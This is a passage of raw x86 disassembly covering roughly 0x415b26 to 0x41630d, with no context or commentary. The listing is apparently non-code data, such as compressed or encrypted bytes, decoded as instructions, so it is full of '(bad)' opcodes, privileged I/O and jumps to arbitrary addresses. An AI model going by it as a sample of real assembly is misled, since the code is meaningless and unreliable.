  415b26:	outs   dx,DWORD PTR ds:[esi]
  415b27:	fisub  WORD PTR ss:[edi+ecx*2-0x4]
  415b2c:	das    
  415b2d:	fisubr WORD PTR [edi+0x43256f45]
  415b33:	retf   
  415b34:	fwait
  415b35:	xchg   ecx,eax
  415b36:	or     eax,0xf31eabbb
  415b3b:	and    eax,0xce67ff51
  415b40:	int    0xc7
  415b42:	shl    BYTE PTR [eax+0x45127b94],0x99
  415b49:	mov    bl,0x4f
  415b4b:	f2xm1  
  415b4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b4e:	ret    
  415b4f:	ficom  DWORD PTR [edi+esi*8+0x4]
  415b53:	sar    dl,0x5d
  415b56:	test   eax,0xfca25f8e
  415b5b:	inc    eax
  415b5c:	mov    WORD PTR [ecx],ds
  415b5e:	cli    
  415b5f:	rcr    BYTE PTR [eax-0x5033ca92],1
  415b65:	cmp    eax,0xaa2c61ad
  415b6a:	pusha  
  415b6b:	xchg   esp,eax
  415b6d:	pop    ebx
  415b6e:	fisttp WORD PTR [esi+0x25]
  415b71:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b73:	and    BYTE PTR [ebp+0x65],ah
  415b76:	sahf   
  415b77:	or     ecx,eax
  415b79:	sbb    esp,ecx
  415b7b:	arpl   WORD PTR [ebp+0x77cb75a1],sp
  415b81:	repz dec edx
  415b83:	jmp    0x8b0505e4
  415b88:	outs   dx,DWORD PTR ds:[esi]
  415b89:	and    DWORD PTR [edi+0x20],0xc0d16f8b
  415b90:	jns    0x415be4
  415b92:	enter  0xda6e,0xd5
  415b96:	and    DWORD PTR [edi-0x4],ebp
  415b99:	xor    edx,DWORD PTR [esi]
  415b9b:	retf   0x498e
  415b9e:	dec    esp
  415b9f:	xchg   edx,eax
  415ba0:	mov    ds:0x68697a7d,eax
  415ba5:	and    DWORD PTR [ebp+0x55e5bd76],ebx
  415bab:	push   0x73
  415bad:	sub    eax,esi
  415baf:	sahf   
  415bb0:	pop    ebx
  415bb1:	xchg   esp,eax
  415bb2:	or     al,0xa7
  415bb4:	fs pop eax
  415bb6:	mov    esi,0xf8d4e3de
  415bbb:	fstp   st(1)
  415bbd:	int    0x47
  415bbf:	and    esi,edx
  415bc1:	mov    dh,0x96
  415bc3:	pushf  
  415bc4:	cmp    al,0xd1
  415bc6:	outs   dx,DWORD PTR ds:[esi]
  415bc7:	mov    ah,0xb9
  415bc9:	out    dx,eax
  415bca:	loop   0x415bfa
  415bcc:	mov    eax,ds:0x1f6ed896
  415bd1:	inc    ecx
  415bd2:	cdq    
  415bd3:	xchg   edi,eax
  415bd4:	or     eax,0xa08fbc23
  415bd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bda:	push   eax
  415bdb:	std    
  415bdc:	adc    ecx,DWORD PTR [esi+eax*8]
  415bdf:	clc    
  415be0:	stos   DWORD PTR es:[edi],eax
  415be1:	inc    edx
  415be2:	test   eax,0xff5a3632
  415be7:	into   
  415be8:	pusha  
  415be9:	xor    ebp,DWORD PTR [ebp-0x6327011e]
  415bef:	jne    0x415c4c
  415bf1:	repz repz sub al,0xb7
  415bf5:	push   edi
  415bf6:	fst    st(3)
  415bf8:	(bad)  
  415bf9:	sub    ch,BYTE PTR [edx-0x1f]
  415bfc:	mov    dh,0xfb
  415bfe:	test   DWORD PTR [eax-0x27],0x5be6c9a6
  415c05:	nop
  415c06:	and    BYTE PTR [eax+0x4a],dh
  415c09:	jmp    0x756c02cd
  415c0e:	in     eax,dx
  415c0f:	cld    
  415c10:	retf   0xcd7b
  415c13:	rcl    DWORD PTR [eax-0x1d062c71],cl
  415c19:	and    eax,0x9251e4c4
  415c1e:	pop    ecx
  415c1f:	ins    DWORD PTR es:[edi],dx
  415c20:	shl    DWORD PTR [ebx+0x22],1
  415c23:	inc    edi
  415c24:	mov    cl,0xe3
  415c26:	(bad)  
  415c27:	xor    DWORD PTR [esi-0xfc88a91],ebx
  415c2d:	stos   BYTE PTR es:[edi],al
  415c2e:	fmul   QWORD PTR [ecx]
  415c30:	shl    DWORD PTR [edi-0x35],1
  415c33:	(bad)  
  415c34:	into   
  415c35:	outs   dx,DWORD PTR ds:[esi]
  415c36:	or     eax,0xd534e228
  415c3b:	pop    eax
  415c3c:	mov    ds:0x796bade9,eax
  415c41:	sbb    ah,BYTE PTR [edi+0x62]
  415c44:	fild   WORD PTR [ebp+0x4f8957f4]
  415c4a:	jne    0x415c5c
  415c4c:	mov    al,0x7b
  415c4e:	mov    ebx,0xee320c1e
  415c53:	mov    ds:0xc1d9a0d6,eax
  415c58:	mov    bl,BYTE PTR fs:[ebp+0x74]
  415c5c:	jmp    0x1f50e253
  415c61:	fdiv   st,st(5)
  415c63:	ins    DWORD PTR es:[edi],dx
  415c64:	cmp    dl,BYTE PTR [ecx]
  415c66:	out    dx,al
  415c67:	inc    ebx
  415c68:	inc    edi
  415c69:	gs int 0xb3
  415c6c:	imul   ebp,eax,0xffffffd8
  415c6f:	int3   
  415c70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c71:	loopne 0x415c6f
  415c73:	(bad)  
  415c74:	dec    ecx
  415c75:	cmp    bh,bh
  415c77:	repnz or BYTE PTR [edx+0x2858a5b9],bh
  415c7e:	fstp   DWORD PTR [esi-0x729f7787]
  415c84:	test   DWORD PTR [edi+0x34],esp
  415c87:	test   eax,0xde89b75e
  415c8c:	xchg   esp,eax
  415c8d:	dec    esi
  415c8e:	jecxz  0x415c1a
  415c90:	fadd   QWORD PTR [ebx+0x6a7160ea]
  415c96:	jge    0x415cc5
  415c98:	retf   
  415c99:	inc    edi
  415c9a:	shl    BYTE PTR [edi-0x78],1
  415c9d:	js     0x415c73
  415c9f:	sbb    DWORD PTR [esp+ebp*2-0x1e6679c0],ebp
  415ca6:	push   edx
  415ca7:	inc    edi
  415ca8:	pop    es
  415ca9:	adc    ch,0x8
  415cac:	hlt    
  415cad:	(bad)  
  415cae:	push   ebx
  415caf:	xchg   BYTE PTR [edi],ch
  415cb1:	jecxz  0x415cb3
  415cb3:	aaa    
  415cb4:	lods   al,BYTE PTR ds:[esi]
  415cb5:	out    dx,eax
  415cb6:	sbb    al,0xea
  415cb8:	in     al,0xea
  415cba:	(bad)  
  415cbb:	cli    
  415cbc:	enter  0x913b,0x5c
  415cc0:	pop    esp
  415cc1:	adc    ecx,DWORD PTR [ebp+0x76]
  415cc4:	mov    eax,0xc0e06e10
  415cc9:	cwde   
  415cca:	sub    BYTE PTR [edx],al
  415ccc:	pop    es
  415ccd:	jmp    0x3f2522fa
  415cd2:	dec    ecx
  415cd3:	les    ecx,FWORD PTR [ebp+edi*4+0x59]
  415cd7:	bound  edx,QWORD PTR [ebp-0x766298b8]
  415cdd:	push   esi
  415cde:	dec    ebp
  415cdf:	ror    DWORD PTR [esi-0x55cec035],1
  415ce5:	xor    DWORD PTR [ebp+esi*2+0x7e01e907],edx
  415cec:	dec    eax
  415ced:	or     DWORD PTR [edx],edx
  415cef:	pop    ebp
  415cf0:	mov    edx,0xfde8f6a6
  415cf5:	xchg   BYTE PTR [edi-0x240aa522],cl
  415cfb:	add    bh,BYTE PTR [edi+0x6f3dc8c6]
  415d01:	or     al,0x5e
  415d03:	clc    
  415d04:	imul   ebp,DWORD PTR ds:0xd202c405,0xfab5f78b
  415d0e:	sub    bh,bl
  415d10:	dec    ebx
  415d11:	mov    ch,BYTE PTR [ebx-0x72]
  415d14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d15:	imul   edx,DWORD PTR [edi],0xffffff93
  415d18:	pop    es
  415d19:	pop    ds
  415d1a:	mov    edx,0x882388cf
  415d1f:	dec    esi
  415d20:	out    dx,al
  415d21:	sbb    BYTE PTR [edx+0x1e8f46fd],ah
  415d27:	jo     0x415d49
  415d29:	xchg   edx,eax
  415d2a:	xchg   ebp,eax
  415d2b:	cwde   
  415d2c:	popf   
  415d2d:	push   ss
  415d2e:	enter  0x9080,0x6e
  415d32:	mov    BYTE PTR [ecx-0x11],dh
  415d35:	(bad)  
  415d36:	adc    eax,0xb26043a7
  415d3b:	(bad)
  415d3e:	call   0x954:0x27cdce83
  415d45:	xor    ebx,DWORD PTR [esi+0x2b6954da]
  415d4b:	xor    DWORD PTR [edx-0x78],esi
  415d4e:	stc    
  415d4f:	enter  0xacd5,0x18
  415d53:	hlt    
  415d54:	jg     0x415d41
  415d56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d57:	cmp    al,0xc6
  415d59:	test   al,0xbe
  415d5b:	mov    ecx,0x5316a650
  415d60:	mov    ds:0x91258f35,al
  415d65:	scas   eax,DWORD PTR es:[edi]
  415d66:	test   al,0x4a
  415d68:	ds pop edx
  415d6a:	rcr    DWORD PTR [edx+esi*1+0x33ca80c0],1
  415d71:	mov    ds:0x9871b415,eax
  415d76:	mov    cl,0x9c
  415d78:	ficom  DWORD PTR [ebx]
  415d7a:	sub    esp,DWORD PTR ds:0xb7a133c2
  415d80:	scas   al,BYTE PTR es:[edi]
  415d81:	loope  0x415d76
  415d83:	push   ss
  415d84:	mov    ds:0xc55ae6cc,eax
  415d89:	icebp  
  415d8a:	mov    dh,0x1d
  415d8c:	inc    ecx
  415d8d:	test   al,0xe3
  415d8f:	cmp    eax,ecx
  415d91:	push   0xffffffaf
  415d93:	out    dx,al
  415d94:	mov    ?,ebx
  415d96:	cmp    eax,0x70f7f043
  415d9b:	arpl   WORD PTR [edi+0x2c],bx
  415d9e:	or     eax,0x4f62c4a1
  415da3:	inc    edx
  415da4:	sbb    eax,DWORD PTR [edi]
  415da6:	out    0x86,al
  415da8:	outs   dx,DWORD PTR ds:[esi]
  415da9:	popf   
  415daa:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  415dac:	adc    eax,0x69778bc
  415db1:	jmp    0x2f24:0xad7af1fc
  415db8:	xchg   DWORD PTR [ecx+0x1eb6c7c7],ebp
  415dbe:	daa    
  415dbf:	jmp    0xe2a0d23
  415dc4:	clc    
  415dc5:	arpl   WORD PTR [edi+0x6679c57b],si
  415dcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415dcc:	xor    DWORD PTR [ebp-0x24bd64cd],ebx
  415dd2:	mov    ebx,0x86b549c1
  415dd7:	add    edx,DWORD PTR [esi+0x3d]
  415dda:	jmp    0x415da6
  415ddc:	mov    eax,0x442174c0
  415de1:	sub    dh,dl
  415de3:	pop    ebx
  415de4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415de5:	xchg   esp,eax
  415de6:	ja     0x415e0d
  415de8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415de9:	add    al,0xed
  415deb:	mov    ah,0x3d
  415ded:	cmp    al,0xab
  415def:	loop   0x415e2c
  415df1:	leave  
  415df2:	push   0x1294ddc9
  415df7:	jb     0x415e5e
  415df9:	xor    eax,0x61300d83
  415dfe:	push   ebp
  415dff:	les    ebx,FWORD PTR [eax+esi*1]
  415e02:	lea    esp,[eax+ecx*2-0x35]
  415e06:	push   ebp
  415e07:	or     ebp,DWORD PTR [ecx+0x43e40fd2]
  415e0d:	mul    DWORD PTR [edi+ebx*1]
  415e10:	and    al,0x3d
  415e12:	or     BYTE PTR [ebx],0x8e
  415e15:	sbb    BYTE PTR [esp+ebx*1+0x1b],cl
  415e19:	jne    0x415df6
  415e1b:	call   0xd309f3b5
  415e20:	es je  0x415e91
  415e23:	cmp    DWORD PTR [edi+0x33],edx
  415e26:	in     al,dx
  415e27:	fdiv   QWORD PTR [edi+0x2e37e93f]
  415e2d:	(bad)  
  415e2e:	hlt    
  415e2f:	pop    edx
  415e30:	loope  0x415dbd
  415e32:	ins    BYTE PTR es:[edi],dx
  415e33:	pop    ebp
  415e34:	and    edx,edi
  415e36:	pop    edi
  415e37:	bt     edi,edx
  415e3a:	aas    
  415e3b:	add    BYTE PTR [ebx-0x6482dbef],dh
  415e41:	ret    0x87e6
  415e44:	mov    edi,ebp
  415e46:	xchg   DWORD PTR [ebp+0x45],edx
  415e49:	(bad)  
  415e4a:	std    
  415e4b:	pop    ss
  415e4c:	xor    dl,cl
  415e4e:	xchg   esi,eax
  415e4f:	icebp  
  415e50:	lds    esp,FWORD PTR [esi]
  415e52:	mov    esp,0xb3e550bd
  415e57:	dec    eax
  415e58:	popa   
  415e59:	or     al,0xfa
  415e5b:	xor    eax,0xbde578a
  415e60:	shl    BYTE PTR [eax+0x5aa99695],0xb4
  415e67:	xchg   edx,eax
  415e68:	in     al,dx
  415e69:	sbb    BYTE PTR [ebp+0x43],0x36
  415e6d:	idiv   BYTE PTR ds:0xa03714a9
  415e73:	push   esi
  415e74:	push   0xe35b5729
  415e79:	fsub   QWORD PTR [edi+eax*2+0x2f81e111]
  415e80:	dec    esi
  415e81:	and    eax,0xb0463ce0
  415e86:	jmp    0xf861134c
  415e8b:	add    eax,0x10ce4179
  415e90:	outs   dx,DWORD PTR ds:[esi]
  415e91:	in     al,0x21
  415e93:	out    0x71,al
  415e95:	cmp    eax,0xd44a01f1
  415e9a:	push   0xffffffc3
  415e9c:	sub    edi,DWORD PTR [esi+edx*2-0x21]
  415ea0:	pop    edx
  415ea1:	pusha  
  415ea2:	mov    WORD PTR [edx+0x41],es
  415ea5:	mov    al,ds:0xb259d8b
  415eaa:	ja     0x415e9c
  415eac:	push   es
  415ead:	jnp    0x415edc
  415eaf:	stc    
  415eb0:	push   ss
  415eb1:	pop    ecx
  415eb2:	push   ds
  415eb3:	leave  
  415eb4:	in     eax,0xe7
  415eb6:	lods   al,BYTE PTR ds:[esi]
  415eb7:	add    ah,dl
  415eb9:	div    BYTE PTR [edx-0x7de6f53b]
  415ebf:	sahf   
  415ec0:	adc    eax,0xb8ae53b7
  415ec5:	(bad)  
  415ec6:	mov    cl,0x9f
  415ec8:	call   DWORD PTR [eax]
  415eca:	xchg   esi,eax
  415ecb:	mov    ds:0x558d0c45,al
  415ed0:	mov    esi,DWORD PTR [edx+eax*8]
  415ed3:	cmp    esp,ecx
  415ed5:	dec    ecx
  415ed6:	sub    DWORD PTR [esi-0x4],ebp
  415ed9:	enter  0x498b,0xe2
  415edd:	dec    ecx
  415ede:	bound  ebx,QWORD PTR [eax+0x33]
  415ee1:	add    ah,BYTE PTR [ebp+0x2b3c0fc]
  415ee7:	unpcklps xmm5,xmm2
  415eea:	mov    ds:0x34fbd3b0,al
  415eef:	aas    
  415ef0:	ret    0x9a1f
  415ef3:	jae    0x415f5c
  415ef5:	fst    QWORD PTR [edx-0x53]
  415ef8:	lock popa 
  415efa:	add    eax,0x548acc8c
  415eff:	sbb    eax,0xdbc1e794
  415f04:	aas    
  415f05:	clc    
  415f06:	jg     0x415f0a
  415f08:	sbb    al,0x8d
  415f0a:	rcl    DWORD PTR [esi],1
  415f0c:	bound  ebp,QWORD PTR [esi-0x7e]
  415f0f:	popa   
  415f10:	lods   al,BYTE PTR ds:[esi]
  415f11:	push   ecx
  415f12:	pusha  
  415f13:	fldcw  WORD PTR ds:0x328d7f7
  415f19:	jns    0x415ecc
  415f1b:	andnps xmm1,XMMWORD PTR [esp+esi*8-0x5259f0ba]
  415f23:	cmp    BYTE PTR [edi-0x51],dh
  415f26:	dec    esp
  415f27:	repnz daa 
  415f29:	fwait
  415f2a:	sar    eax,cl
  415f2c:	std    
  415f2d:	sbb    al,0x7b
  415f2f:	and    cl,cl
  415f31:	pop    edi
  415f32:	mov    ds:0x5bc3f514,eax
  415f37:	call   0xd0c9:0x56c4a61a
  415f3e:	mov    DWORD PTR [ebp+edx*8-0x4d],edi
  415f42:	cmovl  ecx,DWORD PTR [eax-0x14]
  415f46:	add    DWORD PTR [edi-0x295e409c],ecx
  415f4c:	xor    esi,ecx
  415f4e:	push   ebp
  415f4f:	mov    ecx,0x349d5676
  415f54:	iret   
  415f55:	cld    
  415f56:	out    dx,al
  415f57:	mov    eax,0x7029211e
  415f5c:	dec    ebx
  415f5d:	mov    esp,0x90bb2fad
  415f62:	cli    
  415f63:	loop   0x415ef6
  415f65:	cmp    al,0x22
  415f68:	sti    
  415f69:	sti    
  415f6a:	ins    DWORD PTR es:[edi],dx
  415f6b:	jne    0x415f19
  415f6d:	rol    DWORD PTR [esi-0x7c87b866],0x8a
  415f74:	nop
  415f75:	js     0x415efe
  415f77:	mov    dh,0x29
  415f79:	push   esp
  415f7a:	mov    dh,BYTE PTR [edi]
  415f7c:	mov    bl,0x48
  415f7e:	repnz add eax,DWORD PTR ss:[ecx]
  415f82:	lahf   
  415f83:	push   ss
  415f84:	fwait
  415f85:	mov    dh,0x3
  415f87:	mov    edx,0x9104a120
  415f8c:	and    ch,cl
  415f8e:	mov    ds:0x910c38bf,al
  415f93:	mov    ds:0xf7e2279,eax
  415f98:	cmp    eax,0x25598d54
  415f9d:	and    ah,BYTE PTR [ecx-0x1a]
  415fa0:	out    0x80,al
  415fa2:	sbb    al,0x48
  415fa4:	stos   BYTE PTR es:[edi],al
  415fa5:	push   ss
  415fa6:	mov    edi,0xd1d02ae4
  415fab:	addr16 das 
  415fad:	fcmovnbe st,st(5)
  415faf:	es pop edi
  415fb1:	mov    ds:0x7067634a,al
  415fb6:	out    dx,eax
  415fb7:	sub    cl,BYTE PTR ds:0xaf3408c7
  415fbd:	hlt    
  415fbe:	popa   
  415fbf:	push   es
  415fc0:	pop    edx
  415fc1:	test   BYTE PTR ds:0x9e08a4c8,bl
  415fc7:	adc    bl,BYTE PTR [ebx]
  415fc9:	retf   0xb2d1
  415fcc:	das    
  415fcd:	push   ss
  415fce:	and    eax,0x3b83cc41
  415fd3:	js     0x416042
  415fd5:	xchg   edi,eax
  415fd6:	add    al,0x91
  415fd8:	mov    ebx,0xe2985df8
  415fdd:	mov    ch,0x7b
  415fdf:	lock in al,dx
  415fe1:	(bad)  
  415fe2:	fs dec ebp
  415fe4:	ds repnz ss push esi
  415fe8:	cwde   
  415fe9:	enter  0x7475,0xc2
  415fed:	add    eax,0x2ca9d7e9
  415ff2:	fcomip st,st(7)
  415ff4:	xlat   BYTE PTR ds:[ebx]
  415ff5:	jnp    0x415f94
  415ff7:	sbb    al,0x44
  415ff9:	inc    ecx
  415ffa:	sub    DWORD PTR [edx+0x30],esp
  415ffd:	popa   
  415ffe:	mov    ds:0x2cccac09,al
  416003:	test   cl,al
  416005:	xor    DWORD PTR [ebp+0x4c],0x79a0bb48
  41600c:	xchg   ebx,eax
  41600d:	out    0x80,al
  41600f:	arpl   sp,dx
  416011:	sbb    BYTE PTR [ebx],0xed
  416014:	int3   
  416015:	mov    dh,dh
  416017:	fisub  WORD PTR [esi-0x574385cf]
  41601d:	call   0xcb1e:0x32cc595f
  416024:	neg    DWORD PTR [edi]
  416026:	adc    ch,BYTE PTR [eax+0x41]
  416029:	ss pusha 
  41602b:	aaa    
  41602c:	ds xchg edi,eax
  41602e:	pop    edi
  41602f:	fs jb  0x415fdc
  416032:	mov    DWORD PTR [edx+0x3f],ecx
  416035:	cmp    BYTE PTR [eax],0x75
  416038:	not    DWORD PTR ds:0x50a9d127
  41603e:	jo     0x416038
  416040:	test   BYTE PTR [ebp+0x37],ch
  416043:	jnp    0x96fce643
  416049:	mov    DWORD PTR ds:0xdc37d3ec,0xfcc8cd10
  416053:	pushf  
  416054:	sbb    DWORD PTR [esi+ebx*2],eax
  416057:	mov    bh,0x6e
  416059:	sbb    ebx,edx
  41605b:	or     eax,0xb6b500a4
  416060:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416061:	fmul   QWORD PTR [ebx-0x4a]
  416064:	mov    dh,bh
  416066:	or     ecx,DWORD PTR [edx]
  416068:	pushf  
  416069:	loopne 0x4160cc
  41606b:	or     DWORD PTR [eax-0x223c2c49],eax
  416071:	(bad)  
  416072:	aam    0x2c
  416074:	push   0xffffffd0
  416076:	push   eax
  416077:	mov    ecx,DWORD PTR [ecx+ebx*8-0x5]
  41607b:	mov    bh,0x1a
  41607d:	fdiv   QWORD PTR [ecx]
  41607f:	(bad)  
  416080:	retf   
  416081:	in     eax,0x7c
  416083:	fsub   QWORD PTR [ebp-0x7293e11d]
  416089:	mov    esi,ecx
  41608b:	jg     0x4160f0
  41608d:	repnz mov ebp,0xf4a5b77
  416093:	and    dh,dh
  416095:	ins    DWORD PTR es:[edi],dx
  416096:	jb     0x416035
  416098:	call   0xfbcf0866
  41609d:	cmp    ch,bl
  41609f:	adc    BYTE PTR [ecx],bh
  4160a1:	outs   dx,BYTE PTR ds:[esi]
  4160a2:	mov    ecx,0x4f3ba157
  4160a7:	push   es
  4160a8:	(bad)  
  4160a9:	xchg   edx,eax
  4160aa:	ds je  0x416037
  4160ad:	jp     0x41607f
  4160af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160b0:	(bad)  [ecx-0x4b]
  4160b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160b4:	mov    BYTE PTR ss:[eax-0x793f85d9],al
  4160bb:	call   0xd893:0xc543a77e
  4160c2:	ret    
  4160c3:	lods   al,BYTE PTR ds:[esi]
  4160c4:	out    dx,eax
  4160c5:	inc    ebx
  4160c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160c7:	int    0x44
  4160c9:	aaa    
  4160ca:	pop    es
  4160cb:	mov    cl,0xae
  4160cd:	adc    edi,DWORD PTR [edx-0x2af003e1]
  4160d3:	ds cli 
  4160d5:	sbb    esp,DWORD PTR [ebx-0x6447fd3a]
  4160db:	jg     0x416102
  4160dd:	mov    esp,DWORD PTR fs:[edx]
  4160e0:	push   ecx
  4160e1:	mov    edi,0x88e446fb
  4160e6:	dec    esp
  4160e7:	mov    edx,0x227c122b
  4160ec:	xchg   edx,eax
  4160ed:	mov    eax,0xa42f3175
  4160f2:	or     BYTE PTR [ecx],ch
  4160f4:	mov    ebx,0xbe55bb35
  4160f9:	mov    ds:0x8aef44b2,eax
  4160fe:	repz mov bh,0x38
  416101:	or     al,BYTE PTR [edx+edi*2-0x13]
  416105:	inc    ebp
  416106:	mov    ah,0xe0
  416108:	xor    BYTE PTR ds:0x1f4ee6d3,0x5b
  41610f:	retf   0x2483
  416112:	dec    esp
  416113:	popa   
  416114:	mov    ds:0x59c0ac76,al
  416119:	xchg   edi,eax
  41611a:	repz hlt 
  41611c:	cld    
  41611d:	push   0xa5d832a8
  416122:	sbb    DWORD PTR [ecx-0x6c],0xbe9d49ef
  416129:	xchg   ebx,eax
  41612a:	out    0x39,eax
  41612c:	pop    ebp
  41612d:	lock scas eax,DWORD PTR es:[edi]
  41612f:	sub    eax,0x734873ce
  416134:	jb     0x41614b
  416136:	add    ah,BYTE PTR [ebx]
  416138:	mov    ds:0x87fa3b2d,al
  41613d:	xchg   esp,eax
  41613e:	adc    DWORD PTR [edx],ebp
  416140:	sbb    eax,0x3e4b93ef
  416145:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416146:	test   BYTE PTR [edi+0x22037950],bl
  41614c:	ds jno 0x41610e
  41614f:	jge    0x4161b0
  416151:	add    BYTE PTR [eax+ebx*1],bl
  416154:	retf   0xeab1
  416157:	ds push edx
  416159:	or     bl,cl
  41615b:	cmp    eax,0xb225e89e
  416160:	rol    DWORD PTR [eax-0x13043b98],1
  416166:	dec    esp
  416167:	jno    0x41614c
  416169:	fadd   DWORD PTR [eax]
  41616b:	fmul   QWORD PTR [ebx-0x25]
  41616e:	xor    BYTE PTR [ebx],dh
  416170:	into   
  416171:	cmp    BYTE PTR [edi+0x10],0xab
  416175:	sbb    esp,esp
  416177:	sbb    BYTE PTR [edx-0x7bcac02e],ch
  41617d:	and    eax,ebx
  41617f:	data16 jnp 0x416188
  416182:	bound  eax,QWORD PTR [eax]
  416184:	in     eax,0xec
  416186:	icebp  
  416187:	inc    eax
  416188:	test   BYTE PTR [esi+ecx*2-0x61cbc981],cl
  41618f:	and    ah,BYTE PTR [edi]
  416191:	out    0x46,eax
  416193:	neg    DWORD PTR [edi-0x660385cc]
  416199:	mov    fs,WORD PTR [edx+0x7f]
  41619c:	into   
  41619d:	xor    esp,0xfae63b2c
  4161a3:	sub    BYTE PTR [edx+0x37],al
  4161a6:	fs mov esi,cs
  4161a9:	adc    BYTE PTR [eax+0x16],dh
  4161ac:	mov    al,0x88
  4161ae:	into   
  4161af:	lds    edi,FWORD PTR [edx]
  4161b1:	mov    ?,WORD PTR [ebp+0x4f993e02]
  4161b7:	hlt    
  4161b8:	daa    
  4161b9:	jae    0x41619a
  4161bb:	push   es
  4161bc:	shr    ah,1
  4161be:	mov    dl,0x94
  4161c0:	cmc    
  4161c1:	mov    esp,0x9ecd346b
  4161c6:	and    al,0x89
  4161c8:	lea    eax,[ebx-0x44]
  4161cb:	mov    ebp,esp
  4161cd:	outs   dx,BYTE PTR ds:[esi]
  4161ce:	jle    0x4161ab
  4161d0:	add    DWORD PTR [eax],edi
  4161d2:	mov    ebx,ss
  4161d4:	out    0xf,eax
  4161d6:	add    dl,BYTE PTR [esi]
  4161d8:	scas   al,BYTE PTR es:[edi]
  4161d9:	push   cs
  4161da:	stos   BYTE PTR es:[edi],al
  4161db:	(bad)  
  4161dd:	stos   DWORD PTR es:[edi],eax
  4161de:	in     eax,dx
  4161df:	cmp    eax,0xa41977b6
  4161e4:	and    ebp,DWORD PTR [edi+0x4534a6a8]
  4161ea:	or     eax,0x5aaf605b
  4161ef:	and    al,0x7f
  4161f1:	jb     0x416190
  4161f3:	adc    al,0x4e
  4161f5:	enter  0xd113,0xd
  4161f9:	jbe    0x4161f9
  4161fb:	inc    ecx
  4161fc:	sbb    DWORD PTR [ecx],eax
  4161fe:	inc    ecx
  4161ff:	mov    esp,0x83edc6b4
  416204:	(bad)  
  416205:	or     BYTE PTR [esi-0x2e2936ac],cl
  41620b:	cmc    
  41620c:	hlt    
  41620d:	adc    bh,ch
  41620f:	imul   edi,eax,0xad98dd75
  416215:	neg    ebp
  416217:	mov    dh,0x8f
  416219:	mov    dh,0xe2
  41621b:	out    dx,al
  41621c:	es pop es
  41621e:	enter  0x5ead,0x5f
  416222:	push   eax
  416223:	dec    esi
  416224:	sub    al,0xf4
  416226:	jge    0x41621f
  416228:	xor    BYTE PTR [ebp+edx*4-0x34df861],ah
  41622f:	call   0xec2e64d8
  416234:	addr16 inc eax
  416236:	push   edx
  416237:	pop    esi
  416238:	scas   al,BYTE PTR es:[edi]
  416239:	cmp    eax,0x84d34ba4
  41623e:	lods   al,BYTE PTR ds:[esi]
  41623f:	push   eax
  416240:	xor    ebx,DWORD PTR [ebp-0x18]
  416243:	test   DWORD PTR [esi],0xb544617b
  416249:	(bad)  
  41624a:	imul   ebp,DWORD PTR [ebp+edi*2+0x59125334],0x11fcdd4d
  416255:	xchg   ebx,eax
  416256:	mov    BYTE PTR [edx-0x34],ch
  416259:	aam    0x6a
  41625b:	push   ebx
  41625c:	les    ecx,FWORD PTR [esi+0x57457b62]
  416262:	push   esi
  416263:	mov    eax,0x5881c897
  416268:	push   ds
  416269:	pop    es
  41626a:	xchg   esp,eax
  41626b:	and    DWORD PTR [ebx],eax
  41626d:	lods   al,BYTE PTR ds:[esi]
  41626e:	pop    DWORD PTR [edi+0x24e2d1c9]
  416274:	mov    cs,ecx
  416276:	out    0x40,al
  416278:	popa   
  416279:	test   eax,0x45895db3
  41627e:	arpl   WORD PTR [ebp+0x78],si
  416281:	mov    ah,0x61
  416283:	jge    0x4162ab
  416285:	push   edx
  416286:	nop
  416287:	sub    al,0x76
  416289:	aad    0xaf
  41628b:	mov    esi,0x24ee8a0
  416290:	arpl   cx,cx
  416292:	ja     0x4162b1
  416294:	xchg   edi,eax
  416295:	and    DWORD PTR [ecx],edi
  416297:	jg     0x416277
  416299:	cmp    bl,BYTE PTR [ebx]
  41629b:	fild   QWORD PTR [ebp+0x3b]
  41629e:	jnp    0x416295
  4162a0:	sub    ebx,eax
  4162a2:	ficom  WORD PTR [ebx]
  4162a4:	sbb    eax,DWORD PTR ds:0x829460b2
  4162aa:	rcl    DWORD PTR [eax+ecx*8],0x4e
  4162ae:	mov    WORD PTR [eax+esi*4],cs
  4162b1:	mov    cl,0x7a
  4162b3:	cmovl  eax,DWORD PTR [edx-0x6f4ccefc]
  4162ba:	inc    ecx
  4162bb:	repz sbb al,0xe
  4162be:	ds add bl,dh
  4162c1:	jo     0x416283
  4162c3:	jnp    0x4162af
  4162c5:	add    al,0x35
  4162c7:	outs   dx,BYTE PTR ds:[esi]
  4162c8:	add    al,0xf0
  4162ca:	push   edx
  4162cb:	in     eax,dx
  4162cc:	std    
  4162cd:	xchg   esp,eax
  4162ce:	lea    edx,[eax+edi*2]
  4162d1:	mov    ah,0x71
  4162d3:	cmp    bl,BYTE PTR [ecx-0x34f422ed]
  4162d9:	sbb    eax,0x5fe6c0b
  4162de:	and    ah,dh
  4162e0:	gs std 
  4162e2:	ins    DWORD PTR es:[edi],dx
  4162e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162e4:	cld    
  4162e5:	int3   
  4162e6:	push   eax
  4162e7:	mov    bh,0x21
  4162e9:	push   edx
  4162ea:	aaa    
  4162eb:	cmp    eax,0xc3008505
  4162f0:	aaa    
  4162f1:	push   ds
  4162f2:	ret    0x2be7
  4162f5:	in     eax,dx
  4162f6:	sbb    DWORD PTR [edx-0x10],eax
  4162f9:	mov    ch,0x4a
  4162fb:	idiv   DWORD PTR [esi+0x7b4b3039]
  416301:	aad    0xd5
  416303:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416304:	cmp    ebp,DWORD PTR [edi+0x2]
  416307:	sub    al,0x78
  416309:	das    
  41630a:	ja     0x41634b
  41630c:	push   es
  41630d:	mov    al,0xf0
